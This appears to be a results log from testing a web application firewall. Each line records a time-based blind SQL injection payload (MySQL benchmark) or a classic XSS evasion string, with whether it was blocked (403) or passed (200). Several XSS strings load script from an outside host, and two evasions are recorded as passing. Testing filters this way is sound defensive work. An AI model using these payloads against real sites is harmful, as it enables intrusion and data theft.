+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006453523994423449}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006650056995567866}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006566213007317856}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005592877001618035}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005947814002865925}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045372390013653785}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005959907008218579}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006484115001512691}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006689351997920312}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006509865997941233}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006298774009337649}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0059126769920112565}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006716825009789318}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006396153999958187}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005993551996652968}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006650967989116907}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005651339000905864}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0072429360006935894}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007363659999100491}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006963493011426181}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006724521008436568}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007174441998358816}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008534503998816945}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0124167089961702}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.01561074001074303}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007084017008310184}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009296481992350891}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006054131998098455}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00662628399732057}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007378784997854382}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0074835359991993755}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008499696996295825}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00756113399984315}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008338029001606628}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006734848997439258}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0073203770007239655}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005895886992220767}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006270646990742534}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007056242990074679}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00532395500340499}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005948263991740532}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004874754013144411}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005401714006438851}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00623918000201229}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005163512003491633}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00530047899519559}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005168503004824743}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051770999998552725}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005250332003924996}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005129205994307995}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045442639966495335}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004215844004647806}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038152089982759207}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004499065995332785}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005290487999445759}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004501730989431962}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003880926000420004}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00578655100252945}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004944569009239785}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00455919599335175}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0052050899976165965}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005124736999277957}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049423839955125}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004591333999997005}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005878700001630932}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004676399999880232}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004016517996205948}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056266619940288365}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004791711995494552}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004029484000056982}
+{"payload": ",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00535271099943202}
+{"payload": ",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004555102001177147}
+{"payload": ",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004276053005014546}
+{"payload": "',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004834274994209409}
+{"payload": "',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057310440024593845}
+{"payload": "',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004486169986194}
+{"payload": "\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004438696996658109}
+{"payload": "\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004946232002112083}
+{"payload": "\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005577135001658462}
+{"payload": "),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00778381600684952}
+{"payload": "),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.01576667399785947}
+{"payload": "),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009220862004440278}
+{"payload": "'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008615858998382464}
+{"payload": "'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004943777006701566}
+{"payload": "'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006508051999844611}
+{"payload": "\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005522578998352401}
+{"payload": "\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007231264011352323}
+{"payload": "\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004752794993692078}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005077556998003274}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046804369922028854}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037128189869690686}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034922030026791617}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005146119990968145}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004747536004288122}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003976773004978895}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004265370007487945}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00507903000107035}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004354785007308237}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035223200102336705}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003533392009558156}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00637724700209219}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006018561995006166}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006644244000199251}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005317322007613257}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006298324005911127}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007313403009902686}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007987810007762164}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006866330993943848}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007808447000570595}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008570634992793202}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008319569009472616}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008180630000424571}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006364125001709908}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007599888995173387}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006105188993387856}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007147650001570582}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006469607003964484}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007263744992087595}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007017479001660831}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004837519998545758}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007179743988672271}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007017708994681016}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006869481003377587}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007706606003921479}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006387375993654132}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007226504007121548}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007155736006097868}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0058187239919789135}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005736619001254439}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00644033400749322}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005080807997728698}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005651745988870971}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004568748991005123}
+{"payload": "<SCRIPT>alert('XSS');</SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0054907989979255944}
+{"payload": "'';!--\"<XSS>=&{()}", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005897886003367603}
+{"payload": "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005594971007667482}
+{"payload": "<IMG SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005879169999388978}
+{"payload": "<IMG SRC=javascript:alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00796755199553445}
+{"payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00489305799419526}
+{"payload": "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004437044990481809}
+{"payload": "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005375723994802684}
+{"payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005163624009583145}
+{"payload": "SRC=&", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.013102259006700478}
+{"payload": "<IMG SRC=&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004890373005764559}
+{"payload": "<IMG SRC=\"jav", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004887368006166071}
+{"payload": "<IMG SRC=\"jav&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007229540002299473}
+{"payload": "<IMG SRC=\" &", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008359692001249641}
+{"payload": "<IMG%0aSRC%0a=%0a\"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a\"%0a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005499853999936022}
+{"payload": "<IMG SRC=java%00script:alert(\\\"XSS\\\")>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0063138449913822114}
+{"payload": "<SCR%00IPT>alert(\\\"XSS\\\")</SCR%00IPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007256702010636218}
+{"payload": "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008449856002698652}
+{"payload": "<SCRIPT SRC=http://xss.rocks/xss.js?<B>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006511158004286699}
+{"payload": "<IMG SRC=\"javascript:alert('XSS')\"", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007267918001161888}
+{"payload": "<SCRIPT>a=/XSS/", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006285590003244579}
+{"payload": "\\\";alert('XSS');//", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.027851595004904084}
+{"payload": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007780317988363095}
+{"payload": "<BODY BACKGROUND=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009077874012291431}
+{"payload": "<BODY ONLOAD=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0072782839997671545}
+{"payload": "<IMG DYNSRC=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009654501991462894}
+{"payload": "<IMG LOWSRC=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006314701997325756}
